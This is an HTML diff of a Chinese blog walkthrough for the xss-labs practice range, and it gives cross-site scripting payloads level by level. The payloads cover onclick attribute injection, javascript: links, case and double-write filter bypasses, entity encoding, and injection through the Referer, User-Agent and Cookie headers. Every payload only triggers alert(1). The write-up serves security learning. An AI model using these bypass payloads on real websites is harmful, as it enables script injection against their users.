+<p>查看源码，使用了htmlspecialchars函数<br><img src="https://img-blog.csdnimg.cn/20210103103838449.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTUwODMyMw==,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210103103859273.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <p>可以使用不带有尖括号的特殊字符进行尝试<br>如：<code>&#39; onclick=&#39;alert(1)</code><br>（利用了HTML DOM 的onclick事件，点击后触发包含的命令）    </p>
 <ul>
 <li>第一个单引号的作用：闭合<code>value=&#39;</code></li>
-<li>第二个单引号的作用：与valuer=’’的第二个引号对应，构成<code>onclick=&#39;alert(1)&#39;</code><br><img src="https://img-blog.csdnimg.cn/20210103103909655.png" alt="在这里插入图片描述" loading="lazy"></li>
+<li>第二个单引号的作用：与valuer=’’的第二个引号对应，构成<code>onclick=&#39;alert(1)&#39;</code><br><img src="https://img-blog.csdnimg.cn/20210103103909655.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></li>
 </ul>
-<h2 id="Level4"><a href="#Level4" class="headerlink" title="Level4"></a>Level4</h2><p>输入：<code>&quot;&gt;&lt;script&gt;alert(/hack11/)&lt;/script&gt;//</code>        ，<code>&lt;&gt;</code>被过滤<br><img src="https://img-blog.csdnimg.cn/20210103103917456.png" alt="在这里插入图片描述" loading="lazy"></p>
-<p>类似level3，不同的是单引号换为双引号构造闭合：<br><code>&quot; onclick=&quot;alert(1)</code><br><img src="https://img-blog.csdnimg.cn/20210103103921171.png" alt="在这里插入图片描述" loading="lazy"></p>
+<h2 id="Level4"><a href="#Level4" class="headerlink" title="Level4"></a>Level4</h2><p>输入：<code>&quot;&gt;&lt;script&gt;alert(/hack11/)&lt;/script&gt;//</code>        ，<code>&lt;&gt;</code>被过滤<br><img src="https://img-blog.csdnimg.cn/20210103103917456.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<p>类似level3，不同的是单引号换为双引号构造闭合：<br><code>&quot; onclick=&quot;alert(1)</code><br><img src="https://img-blog.csdnimg.cn/20210103103921171.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <h2 id="Level5"><a href="#Level5" class="headerlink" title="Level5"></a>Level5</h2><ul>
-<li><p>尝试 <code>&quot;&gt;&lt;script&gt;alert(/hack11/)&lt;/script&gt;&lt;&quot;</code>，发现script被过滤<br><img src="https://img-blog.csdnimg.cn/20210103103926143.png" alt="在这里插入图片描述" loading="lazy"></p>
+<li><p>尝试 <code>&quot;&gt;&lt;script&gt;alert(/hack11/)&lt;/script&gt;&lt;&quot;</code>，发现script被过滤<br><img src="https://img-blog.csdnimg.cn/20210103103926143.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 </li>
-<li><p>尝试<code>&quot; onclick=&quot;alert(1)</code>，发现on被过滤<br><img src="https://img-blog.csdnimg.cn/2021010310392937.png" alt="在这里插入图片描述" loading="lazy"></p>
+<li><p>尝试<code>&quot; onclick=&quot;alert(1)</code>，发现on被过滤<br><img src="https://img-blog.csdnimg.cn/2021010310392937.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 </li>
-<li><p>最终poc：<code>&quot;&gt;&lt;a href=javascript:alert(1)&gt;&lt;&quot;</code><br><img src="https://img-blog.csdnimg.cn/2021010310393347.png" alt="在这里插入图片描述" loading="lazy"><br>点击即可触发<br><img src="https://img-blog.csdnimg.cn/2021010310393639.png" alt="在这里插入图片描述" loading="lazy"></p>
+<li><p>最终poc：<code>&quot;&gt;&lt;a href=javascript:alert(1)&gt;&lt;&quot;</code><br><img src="https://img-blog.csdnimg.cn/2021010310393347.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>点击即可触发<br><img src="https://img-blog.csdnimg.cn/2021010310393639.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 </li>
 </ul>
 <h2 id="Level6"><a href="#Level6" class="headerlink" title="Level6"></a>Level6</h2><ul>
-<li><p>构造 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>    ，<code>script</code>被过滤<br><img src="https://img-blog.csdnimg.cn/20210103103939777.png" alt="在这里插入图片描述" loading="lazy"></p>
+<li><p>构造 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>    ，<code>script</code>被过滤<br><img src="https://img-blog.csdnimg.cn/20210103103939777.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 </li>
-<li><p>构造 <code>&lt;img src=x onerror=alert(1)&gt;</code>  ,<code>src</code>,<code>on</code>被过滤<br><img src="https://img-blog.csdnimg.cn/20210103103942592.png" alt="在这里插入图片描述" loading="lazy"></p>
+<li><p>构造 <code>&lt;img src=x onerror=alert(1)&gt;</code>  ,<code>src</code>,<code>on</code>被过滤<br><img src="https://img-blog.csdnimg.cn/20210103103942592.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 </li>
-<li><p>构造 <code>&lt;a href=javascript:alert(1)&gt;</code>     ，<code>href</code>被过滤<br><img src="https://img-blog.csdnimg.cn/20210103103945301.png" alt="在这里插入图片描述" loading="lazy"></p>
+<li><p>构造 <code>&lt;a href=javascript:alert(1)&gt;</code>     ，<code>href</code>被过滤<br><img src="https://img-blog.csdnimg.cn/20210103103945301.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 </li>
 </ul>
 <ul>
-<li>最终poc1：<br><code>&quot;&gt;&lt;a Href=javascript:alert(1)&gt;&lt;&quot;</code> 进行大小写绕过<br><img src="https://img-blog.csdnimg.cn/20210103103948721.png" alt="在这里插入图片描述" loading="lazy"><br><img src="https://img-blog.csdnimg.cn/20210103103952207.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTUwODMyMw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></li>
+<li>最终poc1：<br><code>&quot;&gt;&lt;a Href=javascript:alert(1)&gt;&lt;&quot;</code> 进行大小写绕过<br><img src="https://img-blog.csdnimg.cn/20210103103948721.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210103103952207.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTUwODMyMw==,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"></li>
 </ul>
 <ul>
-<li>最终poc2：<br><code>&quot; ONclick=&quot;alert(1)</code>，其他亦同<br><img src="https://img-blog.csdnimg.cn/20210103103956320.png" alt="在这里插入图片描述" loading="lazy"></li>
+<li>最终poc2：<br><code>&quot; ONclick=&quot;alert(1)</code>，其他亦同<br><img src="https://img-blog.csdnimg.cn/20210103103956320.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></li>
 </ul>
 <ul>
-<li>源码：过滤部分关键字，没有对大小写进行针对<br><img src="https://img-blog.csdnimg.cn/20210103104000396.png" alt="在这里插入图片描述" loading="lazy"></li>
+<li>源码：过滤部分关键字，没有对大小写进行针对<br><img src="https://img-blog.csdnimg.cn/20210103104000396.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></li>
 </ul>
 <h2 id="Level7"><a href="#Level7" class="headerlink" title="Level7"></a>Level7</h2><ul>
 <li>老四样测试，script、src、on、href皆被置换为空</li>
 </ul>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="number">1</span>)&lt;/script&gt; </span><br><span class="line">&lt;img src=x onerror=alert(<span class="number">1</span>)&gt;</span><br><span class="line">&lt;svg onload=alert(<span class="number">1</span>)&gt;</span><br><span class="line">&lt;a href=javascript:alert(<span class="number">1</span>)&gt;</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210103104125172.png" alt="在这里插入图片描述" loading="lazy"><br><img src="https://img-blog.csdnimg.cn/20210103104130106.png" alt="在这里插入图片描述" loading="lazy"><br><img src="https://img-blog.csdnimg.cn/20210103104133318.png" alt="在这里插入图片描述" loading="lazy"><br><img src="https://img-blog.csdnimg.cn/20210103104137413.png" alt="在这里插入图片描述" loading="lazy"></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;alert(<span class="hljs-number">1</span>)&lt;/script&gt; <br>&lt;img src=x onerror=alert(<span class="hljs-number">1</span>)&gt;<br>&lt;svg onload=alert(<span class="hljs-number">1</span>)&gt;<br>&lt;a href=javascript:alert(<span class="hljs-number">1</span>)&gt;<br></code></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210103104125172.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210103104130106.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210103104133318.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210103104137413.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <ul>
 <li>尝试大小写绕过，会将输入全部转换为小写，在匹配关键词置换为空</li>
-<li>poc(双写绕过)：<br><code>&quot;&gt;&lt;a hrhrefef=javascriscriptpt:alert(1)&gt;&lt;&quot;</code><br><img src="https://img-blog.csdnimg.cn/20210103104141300.png" alt="在这里插入图片描述" loading="lazy"><br><img src="https://img-blog.csdnimg.cn/20210103104149942.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTUwODMyMw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></li>
+<li>poc(双写绕过)：<br><code>&quot;&gt;&lt;a hrhrefef=javascriscriptpt:alert(1)&gt;&lt;&quot;</code><br><img src="https://img-blog.csdnimg.cn/20210103104141300.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210103104149942.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTUwODMyMw==,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"></li>
 </ul>
 <ul>
 <li>源码：过滤部分关键字：strtolower把所有字符转换为小写再进行过滤</li>
 </ul>
-<p><img src="https://img-blog.csdnimg.cn/20210103104152751.png" alt="在这里插入图片描述" loading="lazy"></p>
+<p><img src="https://img-blog.csdnimg.cn/20210103104152751.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <h2 id="Level8"><a href="#Level8" class="headerlink" title="Level8"></a>Level8</h2><ul>
-<li><p>‘添加友情链接’，应为DOM型xss<br><code>&lt;a href=javascript:alert(1)&gt;</code>：<br>href，javascript都被过滤，大小写和双写绕过都失效<br><img src="https://img-blog.csdnimg.cn/20210103104158240.png" alt="在这里插入图片描述" loading="lazy"></p>
+<li><p>‘添加友情链接’，应为DOM型xss<br><code>&lt;a href=javascript:alert(1)&gt;</code>：<br>href，javascript都被过滤，大小写和双写绕过都失效<br><img src="https://img-blog.csdnimg.cn/20210103104158240.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 </li>
-<li><p>尝试编码绕过<br><code>javascript:alert(1)</code><br><img src="https://img-blog.csdnimg.cn/20210103104201134.png" alt="在这里插入图片描述" loading="lazy"></p>
+<li><p>尝试编码绕过<br><code>javascript:alert(1)</code><br><img src="https://img-blog.csdnimg.cn/20210103104201134.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 </li>
 <li><p>Burpsuite编码</p>
 </li>
 </ul>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;	</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210103104208625.png" alt="在这里插入图片描述" loading="lazy"></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;	<br></code></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210103104208625.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <h2 id="Level9"><a href="#Level9" class="headerlink" title="Level9"></a>Level9</h2><ul>
 <li>DOM型，基于Level8多了一个判定，查看源码，需在构造语句后加上<code>http://</code><br>即：</li>
 </ul>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;<span class="comment">//http://</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;<span class="hljs-comment">//http://</span><br></code></pre></td></tr></table></figure>
 <ul>
-<li>源码：<br>同8，先将关键字替换，再判断变量后是否有<code>http://</code><br>Strpos($str,’http://’)：查找http://在字符串中第一次出现的位置<br><img src="https://img-blog.csdnimg.cn/20210103104218698.png" alt="在这里插入图片描述" loading="lazy"></li>
+<li>源码：<br>同8，先将关键字替换，再判断变量后是否有<code>http://</code><br>Strpos($str,’http://’)：查找http://在字符串中第一次出现的位置<br><img src="https://img-blog.csdnimg.cn/20210103104218698.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></li>
 </ul>
 <h2 id="Level10"><a href="#Level10" class="headerlink" title="Level10"></a>Level10</h2><ul>
-<li><p><code>&lt;script&gt;alert(1)&lt;/script&gt;</code>        过滤了<code>&lt;&gt;</code>，尝试编码不能绕过，无法构造事件触发xss、无法利用属性的javascript协议、无法利用css注入<br><img src="https://img-blog.csdnimg.cn/20210103104223338.png" alt="在这里插入图片描述" loading="lazy"></p>
+<li><p><code>&lt;script&gt;alert(1)&lt;/script&gt;</code>        过滤了<code>&lt;&gt;</code>，尝试编码不能绕过，无法构造事件触发xss、无法利用属性的javascript协议、无法利用css注入<br><img src="https://img-blog.csdnimg.cn/20210103104223338.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 </li>
-<li><p>存在三个input变量，尝试提交<br>源码：<code>&lt;input name=&quot;t_sort&quot;  value=&quot; &#39;.$str33.&#39; &quot; type=&quot;hidden&quot;&gt;</code><br>Payload：<code>1&amp;t_sort=  &quot; type=&quot;text&quot; onclick=&quot;alert(1)</code><br><img src="https://img-blog.csdnimg.cn/20210103104229599.png" alt="在这里插入图片描述" loading="lazy"><br><code>1&amp;t_sort=xxx</code> 将xxx作为t_sort的value输入<br><code>&quot; type=&quot;text&quot; onclick=&quot;alert(1) </code>是置入value    的语句<br><code>type=&quot;text&quot;</code> 形成可点击的文本框，方便触发其后的onclick=”alert(1)</p>
+<li><p>存在三个input变量，尝试提交<br>源码：<code>&lt;input name=&quot;t_sort&quot;  value=&quot; &#39;.$str33.&#39; &quot; type=&quot;hidden&quot;&gt;</code><br>Payload：<code>1&amp;t_sort=  &quot; type=&quot;text&quot; onclick=&quot;alert(1)</code><br><img src="https://img-blog.csdnimg.cn/20210103104229599.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><code>1&amp;t_sort=xxx</code> 将xxx作为t_sort的value输入<br><code>&quot; type=&quot;text&quot; onclick=&quot;alert(1) </code>是置入value    的语句<br><code>type=&quot;text&quot;</code> 形成可点击的文本框，方便触发其后的onclick=”alert(1)</p>
 </li>
 </ul>
 <h2 id="Level11"><a href="#Level11" class="headerlink" title="Level11"></a>Level11</h2><ul>
-<li><p>查看源码<br>仅t_sort和t_ref的可传参，<br><code>$str11=$_SERVER[&#39;HTTP_REFERER&#39;];//</code>将payload从http头的referer栏获取<br><img src="https://img-blog.csdnimg.cn/20210103104242894.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTUwODMyMw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p>
+<li><p>查看源码<br>仅t_sort和t_ref的可传参，<br><code>$str11=$_SERVER[&#39;HTTP_REFERER&#39;];//</code>将payload从http头的referer栏获取<br><img src="https://img-blog.csdnimg.cn/20210103104242894.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTUwODMyMw==,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 </li>
-<li><p>一．<br>浏览器插件修改referfer，<code>value=1&amp;t_sort=  &quot; type=&quot;text&quot; onclick=&quot;alert(1)</code><br><img src="https://img-blog.csdnimg.cn/2021010310424745.png" alt="在这里插入图片描述" loading="lazy"></p>
+<li><p>一．<br>浏览器插件修改referfer，<code>value=1&amp;t_sort=  &quot; type=&quot;text&quot; onclick=&quot;alert(1)</code><br><img src="https://img-blog.csdnimg.cn/2021010310424745.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 </li>
-<li><p>二．<br>利用burpsuite在跳转至该网页时抓包，修改其中<code>referer</code>为<code>poc</code>即可<br><code>1&amp;t_sort=  &quot; type=&quot;text&quot; onclick=&quot;alert(1)</code><br><img src="https://img-blog.csdnimg.cn/20210103104250718.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTUwODMyMw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p>
+<li><p>二．<br>利用burpsuite在跳转至该网页时抓包，修改其中<code>referer</code>为<code>poc</code>即可<br><code>1&amp;t_sort=  &quot; type=&quot;text&quot; onclick=&quot;alert(1)</code><br><img src="https://img-blog.csdnimg.cn/20210103104250718.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTUwODMyMw==,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 </li>
 </ul>
 <h2 id="Level12"><a href="#Level12" class="headerlink" title="Level12"></a>Level12</h2><ul>
-<li>输入：<code>&quot; type=&quot;text&quot; onclick=&quot;alert(1)</code><br><img src="https://img-blog.csdnimg.cn/20210103104256128.png" alt="在这里插入图片描述" loading="lazy"><br><img src="https://img-blog.csdnimg.cn/20210103104300543.png" alt="在这里插入图片描述" loading="lazy"></li>
+<li>输入：<code>&quot; type=&quot;text&quot; onclick=&quot;alert(1)</code><br><img src="https://img-blog.csdnimg.cn/20210103104256128.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210103104300543.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></li>
 </ul>
 <ul>
-<li>从标头中的User-Agent中获取<br>User-Agent：<code>&quot; type=&quot;text&quot; onclick=&quot;alert(1)</code><br><img src="https://img-blog.csdnimg.cn/20210103104302889.png" alt="在这里插入图片描述" loading="lazy"></li>
+<li>从标头中的User-Agent中获取<br>User-Agent：<code>&quot; type=&quot;text&quot; onclick=&quot;alert(1)</code><br><img src="https://img-blog.csdnimg.cn/20210103104302889.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></li>
 </ul>
-<h2 id="Level13"><a href="#Level13" class="headerlink" title="Level13"></a>Level13</h2><p>如图<br><img src="https://img-blog.csdnimg.cn/20210103104321557.png" alt="在这里插入图片描述" loading="lazy"></p>
+<h2 id="Level13"><a href="#Level13" class="headerlink" title="Level13"></a>Level13</h2><p>如图<br><img src="https://img-blog.csdnimg.cn/20210103104321557.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <ul>
-<li>查看标头<br><img src="https://img-blog.csdnimg.cn/20210103104326596.png" alt="在这里插入图片描述" loading="lazy"></li>
+<li>查看标头<br><img src="https://img-blog.csdnimg.cn/20210103104326596.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></li>
 </ul>
 <ul>
 <li>修改cookie<br>Cookie：<code>user=&quot;type=&quot;text&quot; onclick=&quot;alert(1)&quot;</code></li>
 </ul>
-<p><img src="https://img-blog.csdnimg.cn/20210103104328932.png" alt="在这里插入图片描述" loading="lazy"></p>
+<p><img src="https://img-blog.csdnimg.cn/20210103104328932.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <h2 id="Level14"><a href="#Level14" class="headerlink" title="Level14"></a>Level14</h2><p>百度一下：本关因iframe调用的文件地址失效，无法进行测试。要考的应该是通过修改    iframe调用的文件来实现xss注入</p>
 <h2 id="Level15"><a href="#Level15" class="headerlink" title="Level15"></a>Level15</h2><ul>
-<li><p>ng-include指令一般用于包含外部的 HTML 文件，ng-include属性的值可以是一个表达    式，返回一个文件名，但是默认情况下，包含的文件需要包含在同一个域名下。<br><img src="https://img-blog.csdnimg.cn/20210103104335693.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTUwODMyMw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p>
+<li><p>ng-include指令一般用于包含外部的 HTML 文件，ng-include属性的值可以是一个表达    式，返回一个文件名，但是默认情况下，包含的文件需要包含在同一个域名下。<br><img src="https://img-blog.csdnimg.cn/20210103104335693.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTUwODMyMw==,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 </li>
 <li><p>可以包含一个有漏洞的页面进行破解<br>eg:    <code>level15.php?src=&#39;name=&lt;script&gt;alert(1)&lt;/script&gt;&#39;</code></p>
 </li>
 </ul>
 <h2 id="Level16"><a href="#Level16" class="headerlink" title="Level16"></a>Level16</h2><ul>
-<li><p><code>&lt;script&gt;alert(1)&lt;/script&gt;</code><br><img src="https://img-blog.csdnimg.cn/20210103104340627.png" alt="在这里插入图片描述" loading="lazy"></p>
+<li><p><code>&lt;script&gt;alert(1)&lt;/script&gt;</code><br><img src="https://img-blog.csdnimg.cn/20210103104340627.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 </li>
-<li><p>空格、反斜杠、script都被str_replace函数替换成&amp;nbsp<br><img src="https://img-blog.csdnimg.cn/20210103104344405.png" alt="在这里插入图片描述" loading="lazy"></p>
+<li><p>空格、反斜杠、script都被str_replace函数替换成&amp;nbsp<br><img src="https://img-blog.csdnimg.cn/20210103104344405.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 </li>
-<li><p>HTML中可以将%0a或者%0D当成空格使用，故可构造<br>Poc：<code>&lt;svg%0aonload=alert(1)&gt;</code><br><img src="https://img-blog.csdnimg.cn/20210103104347190.png" alt="在这里插入图片描述" loading="lazy"></p>
+<li><p>HTML中可以将%0a或者%0D当成空格使用，故可构造<br>Poc：<code>&lt;svg%0aonload=alert(1)&gt;</code><br><img src="https://img-blog.csdnimg.cn/20210103104347190.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 </li>
 </ul>
 <h2 id="Level17"><a href="#Level17" class="headerlink" title="Level17"></a>Level17</h2><ul>
-<li><p>Url中：level17.php?arg01=123&amp;arg02=321<br>将arg01和arg02的结果用=拼接<br><img src="https://img-blog.csdnimg.cn/20210103104351645.png" alt="在这里插入图片描述" loading="lazy"></p>
+<li><p>Url中：level17.php?arg01=123&amp;arg02=321<br>将arg01和arg02的结果用=拼接<br><img src="https://img-blog.csdnimg.cn/20210103104351645.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 </li>
-<li><p>可利用此构造：<code>onclick=javascript:alert(/xss/)</code><br>Poc：<code>level17.php?arg01= onmousemove&amp;arg02=javascript:alert(/xss/)</code><br><img src="https://img-blog.csdnimg.cn/20210103104355713.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTUwODMyMw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p>
+<li><p>可利用此构造：<code>onclick=javascript:alert(/xss/)</code><br>Poc：<code>level17.php?arg01= onmousemove&amp;arg02=javascript:alert(/xss/)</code><br><img src="https://img-blog.csdnimg.cn/20210103104355713.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTUwODMyMw==,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 </li>
 </ul>
-<h2 id="Level18"><a href="#Level18" class="headerlink" title="Level18"></a>Level18</h2><p>同17<br><img src="https://img-blog.csdnimg.cn/20210103104358763.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTUwODMyMw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p>
-</div><div id="reward-container"><span class="hty-icon-button button-glow" id="reward-button" title="打赏" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === &quot;none&quot;) ? &quot;block&quot; : &quot;none&quot;;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-hand-coin-line"></use></svg></span><div id="reward-comment">I'm so cute. Please give me money.</div><div id="qr" style="display:none;"><div style="display:inline-block"><a href="/images/zfbpay.jpg"><img loading="lazy" src="/images/zfbpay.jpg" alt="支付宝" title="支付宝"></a><div><span style="color:#00A3EE"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-alipay-line"></use></svg></span></div></div><div style="display:inline-block"><a href="/images/qqpay.png"><img loading="lazy" src="/images/qqpay.png" alt="QQ 支付" title="QQ 支付"></a><div><span style="color:#12B7F5"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-qq-line"></use></svg></span></div></div><div style="display:inline-block"><a href="/images/wcpay.png"><img loading="lazy" src="/images/wcpay.png" alt="微信支付" title="微信支付"></a><div><span style="color:#2DC100"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-wechat-pay-line"></use></svg></span></div></div></div></div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>Na0h_1e3</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="http://na0hblog.top/2021/01/03/xss-lab%E9%80%9A%E5%85%B3%E5%B0%8F%E8%AE%B0/" title="xss-lab通关小记">http://na0hblog.top/2021/01/03/xss-lab%E9%80%9A%E5%85%B3%E5%B0%8F%E8%AE%B0/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><svg class="icon"><use xlink:href="#icon-creative-commons-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-by-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-nc-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-sa-line"></use></svg></a> 许可协议。</li></ul></section></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/2021/01/16/Pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%B0%8F%E8%AE%B0/" rel="prev" title="Pikachu靶场的小记"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-left-s-line"></use></svg><span class="post-nav-text">Pikachu靶场的小记</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/2020/12/30/sql%E6%B3%A8%E5%85%A5%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9F%BA%E6%93%8D/" rel="next" title="sql注入的一些基操"><span class="post-nav-text">sql注入的一些基操</span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-right-s-line"></use></svg></a></div></div></div><div id="comment"><div class="comment-tooltip 